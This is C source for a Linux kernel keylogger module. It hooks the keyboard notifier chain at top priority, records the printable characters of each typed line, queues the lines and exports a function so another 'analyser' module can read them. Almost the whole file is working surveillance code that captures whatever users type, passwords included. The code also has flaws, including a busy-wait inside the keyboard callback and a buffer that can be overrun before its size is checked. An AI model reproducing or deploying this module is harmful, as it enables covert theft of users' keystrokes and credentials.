#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h> 	/* for keyboard structures and events. */
#include <linux/input.h> 		/* for struct input_event and other vars and defs. */
#include <linux/kmod.h> 		/* for call_usermodehelper function. */
#include <linux/mutex.h> 		/* for locking. */
#include <linux/kthread.h> 		/* for kthread. */
#include <linux/sched.h> 		/* for struct task_struct. */
#include <linux/unistd.h>
#include <linux/delay.h>		/* for msleep function. */
#include <linux/slab.h>

/************ Queue structures, prototypes and definitions. ************/

/**
 * Queue structure. It holds a Elem pointer which could be any type
 * set up at compile time.
 */
struct Queue {
	char* elem;
	struct Queue* next;
};

/* prototypes. */
int queue_isEmpty(void);
struct Queue* queue_getFront(void);
struct Queue* queue_dequeue(void);
void queue_enqueue(char* sentence);
void queue_clear(void);

/**
 * The @head and @tail pointers are used to manage the whole queue functionality.
 */
static struct Queue* head = NULL;
static struct Queue* tail = NULL;

/**
 * queue_isEmpty.
 *
 * Tests if the head of the queue has a valid reference.
 * Returns 1 if the queue is empty, 0 otherwise.
 */
int queue_isEmpty(void) {
	return (head == NULL);
}

/**
 * queue_getFront.
 *
 * Tests if the queue has any elements and returns the head
 * of the queue.
 */
struct Queue* queue_getFront(void) {
	if (queue_isEmpty()) {
		return NULL;
	} else {
		return head;
	}
}

/**
 * queue_dequeue.
 *
 * Extracts an element from the queue.
 */
struct Queue* queue_dequeue(void) {
	if (queue_isEmpty()) {
		return NULL;
	} else {
		struct Queue* node = head;
		head = head->next;
		return node;
	}
}

/**
 * queue_enqueue.
 *
 * @str: the Elem value to be inserted.
 *
 * Inserts an element into the queue.
 */
void queue_enqueue(char* str) {
	struct Queue* newNode = (struct Queue*)kmalloc(sizeof(struct Queue), GFP_KERNEL);
	newNode->elem = (char*)kmalloc((1 + strlen(str)) * sizeof(char), GFP_KERNEL);
	strcpy(newNode->elem, str);
	newNode->next = NULL;
    /* insert. */
	if (queue_isEmpty()) {
		/* initialize the head and the queue (first element). */
		head = newNode;
	} else if (tail == NULL) {
		/* initialize the tail of the queue (second element). */
		tail = newNode;
		head->next = tail;
	} else {
        /* insert at the tail (n-th element). */
		tail->next = newNode;
		tail = newNode;
	}
}

/**
 * queue_clear.
 *
 * Deletes all the elements from the queue.
 * Usually this kind of function has O(n) complexity. However, in our case,
 * this function should have better performance. The while loop should run
 * at most once.
 */
void queue_clear(void) {
	struct Queue* node;
	if (!queue_isEmpty()) {
		while (head != NULL) {
			node = head;
			head = head->next;
			kfree(node->elem);
			kfree(node);
		}
	}
	head = NULL;
    tail = NULL;
}

/********************** End of Queue structure prototypes and definitions.***********************/

/* defines. */
#define BUFFER_LEN  1024
#define DELAY 		50

/* local variables. */
static char keys_buffer[BUFFER_LEN];  /* This buffer will contain the logged keys from the last LF. */
static char *keys_bf_ptr = keys_buffer;
static struct task_struct* write_thread = NULL; /* thread for working with the queue. */
static struct mutex lock;
static int buffer_flag;

/* external symbols. */
static struct Queue* readKeylogQueue(void);
EXPORT_SYMBOL(readKeylogQueue);

/* Prototypes. */
static int keys_pressed(struct notifier_block *, unsigned long, void *); /* Callback function for the Notification Chain. */
static int write_queue(void* data); /* function to write sentence to the queue to be analysed later. */

/* Initializing the notifier_block. */
static struct notifier_block nb = {
	.notifier_call = keys_pressed,
    .priority = INT_MAX /* be the first function called. */
};

/**
 * readKeylogQueue - access keylog queue and return a string.
 * 
 * @return the head of the wueue containing a sentence.
 * 
 * This function is exported and will be used by the analyser module
 * to consume the queue elements.
 */
static struct Queue* readKeylogQueue(void) {
	struct Queue* queueHead = NULL;
	/* acquire lock. */
    mutex_lock(&lock);
    /* obtain string. */
    queueHead = queue_dequeue();
    if (queueHead != NULL) {
		printk(KERN_INFO "A scos din coada: %s.\n", queueHead->elem);
	}
    /* release lock. */
    mutex_unlock(&lock);
    /* return the string. */
    return queueHead;
}

/**
 * write_queue - adds a string to the keylog string queue.
 * 
 * @ptr - parameter required by kthread_create.
 * 
 * The 'analyser' module will consume this queue.
 */
static int write_queue(void* ptr) {
	while (!kthread_should_stop()) {
		if (buffer_flag == 1) {
			/* ready to read buffer. */
			int size = (keys_bf_ptr - keys_buffer) + 1;
			/* acquire lock. */
			mutex_lock(&lock);
			/* write quque. */
			queue_enqueue(keys_buffer);
			/* reset. */
			memset(keys_buffer, 0, BUFFER_LEN);
			keys_bf_ptr = keys_buffer;
			/* release lock. */
			mutex_unlock(&lock);
			buffer_flag = 0;
		} else {
			msleep(DELAY);
		}
	}
    return 0;
}

/**
 * keys_pressed - Notification chain subscriber function. 
 * 
 * @nb - pointer to the notifier block structure.
 * @action - describe type of event.
 * @data - actual key code.
 * 
 * This function is executed when an input event is triggered.
 */
static int keys_pressed(struct notifier_block *nb, unsigned long action, void *data) {
	struct keyboard_notifier_param *param = data;
    
	if (action == KBD_KEYSYM && param->down) {
		char code = param->value;
		/* We will only log those key presses that actually represent an ASCII character. */
		if (code == 0x01) { /* asii code for LF (enter / return / new line). */
            if (keys_bf_ptr != keys_buffer) {
				/* let write_queue thread send the contents. */
                while (buffer_flag == 1)
                { }
                buffer_flag = 1;
            }
		} else if (code == 0x7f) { /* code for backspace. */
            if (keys_bf_ptr != keys_buffer) {
                *(--keys_bf_ptr) = '\0';
            }
        } else if (code >= 0x20 && code < 0x7f) {
			*(keys_bf_ptr++) = code;
        }
		/* check buffer overflow. */
		/* desi pana sa verifice asta crapa modulul :)) */
		if ((keys_bf_ptr - keys_buffer) >= BUFFER_LEN) {
            printk(KERN_INFO "_OVRFL The buffer has overflowed!\n");
			memset(keys_buffer, 0, BUFFER_LEN);
			keys_bf_ptr = keys_buffer;
		}
	}
	return NOTIFY_OK;
}

/***** init function. *****/
static int __init keylog_init(void) {
	/* init mutex. */
	mutex_init(&lock);
    /* register keyboard notifier. */
    int result;
    result = register_keyboard_notifier(&nb);
    if (result < 0) {
		printk(KERN_INFO "__KEYLOG Keyboard notifier register result: %d.\n", result);
		return result;
	}
	memset(keys_buffer, 0, BUFFER_LEN);
    buffer_flag = 0; /* buffer not ready to read. */
    /* init start kthread. */
	write_thread = kthread_run(write_queue, NULL, "K_write_queue_th");
	if (write_thread == NULL || IS_ERR(write_thread)) {
		printk(KERN_INFO "*KL __KEYLOG_INIT: Cannot create kthread.\n");
		return PTR_ERR(write_thread);
	}
	printk(KERN_INFO "_KEYLOGGER Init success.\n");
	return 0;
}

/***** exit function -> free memory and stuff. *****/
static void __exit keylog_exit(void) {
	unregister_keyboard_notifier(&nb);
	/* stop kthread. */
	kthread_stop(write_thread);
	/* free memory. */
	queue_clear();
	printk(KERN_INFO "__KEYLOGGER unloaded.\n");
}

/* init and exit functions. */
module_init(keylog_init);
module_exit(keylog_exit);

MODULE_AUTHOR("Razvan AGAPE");
MODULE_LICENSE("GPL");
